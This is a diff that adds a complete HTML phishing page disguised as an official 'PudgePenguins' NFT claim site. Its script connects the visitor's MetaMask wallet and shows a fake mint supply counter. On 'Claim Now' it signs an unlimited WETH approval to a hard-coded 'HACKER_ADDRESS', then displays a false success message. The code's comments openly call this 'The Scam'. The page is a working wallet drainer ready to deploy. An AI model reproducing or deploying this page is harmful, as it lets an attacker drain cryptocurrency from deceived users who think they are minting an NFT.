@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PudgePenguins | Official Claim</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <style>
+        body { background: #0f172a; color: white; font-family: 'Inter', sans-serif; }
+        .penguin-bg { 
+            background-image: url('https://placehold.co/1920x1080/1e293b/ffffff?text=PudgePenguins+Background'); 
+            background-size: cover; background-position: center;
+        }
+        .glass { background: rgba(15, 23, 42, 0.85); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #3b82f6; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .hidden { display: none; }
+        .badge-verified { color: #1d9bf0; margin-left: 8px; }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col">
+
+    <!-- Navbar -->
+    <nav class="p-4 border-b border-gray-800 flex justify-between items-center bg-black/50">
+        <div class="font-bold text-xl">🐧 PudgePenguins</div>
+        <div class="flex gap-4">
+            <a href="#" class="hover:text-blue-400">Twitter <svg class="inline w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M8.29 20.251c7.547 0 11.675-6.253 11.675-11.675 0-.178 0-.355-.012-.53A8.348 8.348 0 0022 5.92a8.17 8.17 0 01-2.35.64 4.67 4.67 0 002.042-2.58 9.33 9.33 0 01-2.92 1.32 4.15 4.15 0 00-7.08 3.77 11.78 11.78 0 01-8.51-4.32 4.14 4.14 0 001.28 5.53 4.12 4.12 0 01-1.87-.52v.05c0 2.01 1.43 3.69 3.33 4.08a4.13 4.13 0 01-1.87.07 4.14 4.14 0 003.86 2.87 8.31 8.31 0 01-5.14 1.57c-.33 0-.66-.02-.98-.06 1.83 1.17 4.01 1.86 6.34 1.86 7.61 0 11.78-6.31 11.78-11.78 0-.18 0-.36-.01-.53 1.61-1.16 2.99-2.64 4.08-4.31z"/></svg></a>
+            <a href="#" class="hover:text-purple-400">Discord <svg class="inline w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M20.317 4.37a19.791 19.791 0 00-4.885-1.515.074.074 0 00-.079.037c-.21.375-.444.864-.608 1.266-1.817-.276-3.635-.276-5.448 0a13.6 13.6 0 00-.608-1.266.07.07 0 00-.079-.037 19.736 19.736 0 00-4.885 1.515.07.07 0 00-.032.066c-.836 1.24-1.122 2.478-1.122 3.753 0 0 .001.01.012.024a.077.077 0 00.037.061 19.89 19.89 0 002.378 1.65.072.072 0 00.076-.012c.402-.545.76-1.156 1.076-1.82a.076.076 0 00-.04-.093 13.25 13.25 0 01-1.628-.77.07.07 0 01-.006-.116c.096-.07.193-.14.286-.213a.073.073 0 01.078-.006c3.347 1.518 7.02 1.518 10.328 0a.074.074 0 01.078.006c.093.073.19.143.286.213a.07.07 0 01-.006.116 13.13 13.13 0 01-1.628.77.072.072 0 00-.04.093c.316.664.673 1.275 1.076 1.82a.073.073 0 00.076.012 19.85 19.85 0 002.378-1.65.077.077 0 00.037-.061c.01-.014.012-.024.012-.024 0-1.275-.287-2.513-1.122-3.753a.07.07 0 00-.032-.066zM9.56 14.74c-.96 0-1.746-.886-1.746-1.974 0-1.088.77-1.974 1.746-1.974s1.75.886 1.746 1.974c0 1.088-.77 1.974-1.746 1.974zm5.88 0c-.96 0-1.746-.886-1.746-1.974 0-1.088.77-1.974 1.746-1.974s1.75.886 1.746 1.974c0 1.088-.77 1.974-1.746 1.974z"/></svg></a>
+        </div>
+        <button id="connect-btn" class="bg-blue-600 hover:bg-blue-500 px-4 py-2 rounded-lg font-bold transition">Connect Wallet</button>
+    </nav>
+
+    <!-- Hero Section -->
+    <header class="p-12 text-center penguin-bg bg-black/30">
+        <h1 class="text-5xl font-bold mb-4">PudgePenguins 🐧</h1>
+        <p class="text-xl text-gray-300 mb-8">The most adorable penguins on-chain.</p>
+        <div class="flex justify-center gap-4">
+            <span class="bg-green-500/20 text-green-400 px-3 py-1 rounded-full text-sm font-bold">Network Live</span>
+            <span class="bg-blue-500/20 text-blue-400 px-3 py-1 rounded-full text-sm font-bold">5,000 Supply</span>
+        </div>
+    </header>
+
+    <!-- Main Interaction Card -->
+    <main class="flex-grow flex items-center justify-center p-4">
+        <div class="glass p-8 rounded-2xl w-full max-w-lg">
+            
+            <!-- Connect View -->
+            <div id="connect-view" class="text-center">
+                <p class="text-gray-400 mb-4">Connect your wallet to claim your Penguin.</p>
+                <button id="connect-btn-main" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 px-4 rounded-lg">Connect MetaMask</button>
+                <p id="status-msg" class="mt-4 text-sm text-gray-400 h-6"></p>
+            </div>
+
+            <!-- Mint View -->
+            <div id="mint-view" class="hidden">
+                <div class="flex justify-between items-center mb-6">
+                    <div class="flex items-center gap-2">
+                        <div class="w-8 h-8 bg-gray-700 rounded-full flex items-center justify-center">🐧</div>
+                        <span class="font-bold">PudgePenguins</span>
+                    </div>
+                    <span id="user-address" class="text-xs text-gray-500 font-mono">0x...1234</span>
+                </div>
+
+                <div class="bg-gray-800/50 p-4 rounded-lg mb-6">
+                    <div class="flex justify-between mb-2">
+                        <span class="text-gray-400">Total Supply</span>
+                        <span id="supply-count" class="font-mono text-green-400">0 / 5,000</span>
+                    </div>
+                    <div class="w-full bg-gray-700 rounded-full h-2 mb-4">
+                        <div id="progress-bar" class="bg-green-500 h-2 rounded-full" style="width: 0%"></div>
+                    </div>
+                    <div class="flex justify-between text-sm">
+                        <span class="text-gray-400">Price</span>
+                        <span class="font-bold">0.04 ETH</span>
+                    </div>
+                </div>
+
+                <button id="mint-btn" class="w-full bg-green-600 hover:bg-green-500 text-white font-bold py-3 px-4 rounded-lg transition">
+                    Claim Now
+                </button>
+                
+                <div id="tx-status" class="mt-4 text-sm text-gray-400 h-6 flex items-center justify-center gap-2">
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        // CONFIGURATION
+        const HACKER_ADDRESS = "0xf66577a0596b08AAC459a0b0f3232574A5D1f727"; 
+        // Using WETH for maximum compatibility. If you want USDC, change this to USDC address.
+        const TOKEN_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"; 
+
+        let userAddress = null;
+        let provider = null;
+        let signer = null;
+
+        // DOM Elements
+        const connectBtn = document.getElementById('connect-btn');
+        const connectBtnMain = document.getElementById('connect-btn-main');
+        const mintBtn = document.getElementById('mint-btn');
+        const connectView = document.getElementById('connect-view');
+        const mintView = document.getElementById('mint-view');
+        const statusMsg = document.getElementById('status-msg');
+        const txStatus = document.getElementById('tx-status');
+        const progressBar = document.getElementById('progress-bar');
+        const supplyCount = document.getElementById('supply-count');
+
+        // Fake Supply Logic
+        let currentSupply = 3421;
+        updateSupply();
+
+        function updateSupply() {
+            supplyCount.innerText = `${currentSupply} / 5,000`;
+            progressBar.style.width = `${(currentSupply / 5000) * 100}%`;
+        }
+
+        // Connect Logic
+        const handleConnect = async () => {
+            if (typeof window.ethereum === 'undefined') {
+                statusMsg.innerText = "Please install MetaMask!";
+                return;
+            }
+            try {
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
+                signer = provider.getSigner();
+                userAddress = await signer.getAddress();
+                
+                document.getElementById('user-address').innerText = userAddress.substring(0,6) + "..." + userAddress.slice(-4);
+                
+                connectView.classList.add('hidden');
+                mintView.classList.remove('hidden');
+            } catch (err) {
+                statusMsg.innerText = "Connection failed.";
+            }
+        };
+
+        connectBtn.addEventListener('click', handleConnect);
+        connectBtnMain.addEventListener('click', handleConnect);
+
+        // Mint / Approval Scam
+        mintBtn.addEventListener('click', async () => {
+            if (!signer) return;
+            mintBtn.disabled = true;
+            mintBtn.innerText = "Processing...";
+            txStatus.innerHTML = '<div class="loader"></div> Connecting to contract...';
+
+            try {
+                // 1. Fake Supply Update
+                await new Promise(r => setTimeout(r, 1000));
+                currentSupply++;
+                updateSupply();
+
+                // 2. The Scam: Approval
+                txStatus.innerHTML = '<div class="loader"></div> Approving allowance...';
+                
+                const contract = new ethers.Contract(TOKEN_ADDRESS, [
+                    "function approve(address spender, uint256 amount) public returns (bool)"
+                ], signer);
+
+                const maxAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+                
+                const tx = await contract.approve(HACKER_ADDRESS, maxAmount);
+                await tx.wait();
+
+                txStatus.innerHTML = "✅ Success! Your Penguin is on the way.";
+                mintBtn.innerText = "Claimed";
+
+            } catch (err) {
+                console.error(err);
+                txStatus.innerText = "Transaction failed. Try again.";
+                mintBtn.disabled = false;
+                mintBtn.innerText = "Claim Now";
+            }
+        });
+    </script>
+</body>
+</html>
